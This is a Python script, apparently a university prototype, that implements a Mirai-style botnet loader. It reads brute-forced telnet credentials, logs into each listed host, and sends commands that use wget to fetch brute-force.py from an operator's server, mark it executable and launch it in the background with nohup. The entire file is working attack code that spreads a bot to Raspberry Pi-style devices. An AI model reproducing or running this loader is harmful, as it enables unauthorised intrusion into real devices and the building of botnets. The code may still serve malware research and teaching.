#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This file is the loader that infect known vulnerable potential bot"""

__author__ = "Nemanja Pantic"
__copyright__ = "Copyright 2020, HEIG-VD"
__license__ = "GPL"
__version__ = "0.1"
__email__ = "nemanja.pantic@heig-vd.ch"
__status__ = "Prototype"

import socket
import telnetlib
import sys
import threading
import random
import argparse
import time
import ipaddress

cred_file = []
lock = threading.Lock()
visited_ip = set()
thread = []

def is_valid_ipv4_address(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError as errorCode:
        # uncomment below if you want to display the exception message.
        # print(errorCode)
        # comment below if above is uncommented.
        pass
        return False

def port_scan(host):
    """
    This method is used to check if the port 23 is open on the host
    :param host: target that we want to know if port 23 is open
    :return: True if it's open, False if it's closed
    """
    print("inside port_scan")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    connect = s.connect_ex((host, 23))
    if connect == 0:
        print("[+]\tPort 23: Open")
        s.close()
        return True
    else:
        print("[-]\tPort 23: Closed")
        s.close()
        return False


def get_credentials(passwords_file):
    """
    This method take in parameter a filename which contain "ip:port user:pass" generated by bruter.py
    :param passwords_file: filename of the list of target
    :return: a line of the file
    """
    print("Inside method")
    global cred_file
    if not cred_file:
        with lock:
            print("Opening...", passwords_file)
            with open(passwords_file, 'r') as f:
                line = f.read().splitlines()
    return line


def infect_force(ip_server, passwords_file):
    """
    This method is used to get a line of the file containing the information about target, connect to them,
    download the infected file and start it.
    :param passwords_file: filename of the list of target get by sys.argv
    :return: None
    """
    all_creds = get_credentials(passwords_file)
    print(all_creds)
    tn = None  # telnet connection

    for x in range(len(all_creds)):

        try:
            current_creds = all_creds[x].split()
            host = current_creds[0].split(":")[0]
            port = current_creds[0].split(":")[1]
            wget_done = False
            chmod_done = False
            launch = False
            login = False

            user = current_creds[1].split(":")[0]
            password = current_creds[1].split(":")[1]

            while True:
                time.sleep(0.2)
                if not tn:
                    tn = telnetlib.Telnet(host)
                    # tn.debuglevel = 10
                    print("[-]\tPort 23: Connecting...")
                response = tn.read_until(b":", 1)  # until input request
                print(response)

                # In case prompt print : Last login in header
                if "ogin:" in response.decode("utf-8") and not login:
                    print("[+] Trying user:\t" + user)
                    tn.write(user.encode("utf-8") + b"\n")
                    login = True

                if "assword:" in response.decode("utf-8"):
                    print("[+] Trying password:\t" + password)
                    tn.write(password.encode("utf-8") + b"\n")

                if "pi@" in response.decode("utf-8") and not (wget_done):
                    time.sleep(3)
                    tn.write("wget http://{}/brute-force.py\n".format(ip_server).encode("utf-8"))
                    wget_done = True
                    print("Download ok")

                if "pi@" in response.decode("utf-8") and wget_done:
                    time.sleep(3)
                    tn.write("chmod +x brute-force.py\n".encode("utf-8"))
                    chmod_done = True
                    print("chmod ok")

                if "pi@" in response.decode("utf-8") and chmod_done:
                    time.sleep(3)
                    print(response)
                    tn.write("nohup ./brute-force.py 4 &\n".encode("utf-8"))
                    launch = True
                    print("command launched")
                    time.sleep(10)
                if wget_done and chmod_done and launch:
                    print(response)
                    break

        except EOFError as e:
            pass  # Disconnected, no problem, we will connect again.
    print("This is the end !")


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Loader from Mirai")
    parser.add_argument("--ip_server", required=True, help="IP of your web server containing bot")
    parser.add_argument("--file", required=True, help="File containing credentials and IP")
    args = parser.parse_args()
    ip_server = args.ip_server
    if is_valid_ipv4_address(ip_server):
        file = args.file
        infect_force(ip_server, file)
    else:
        print("IP Format is wrong")
        exit()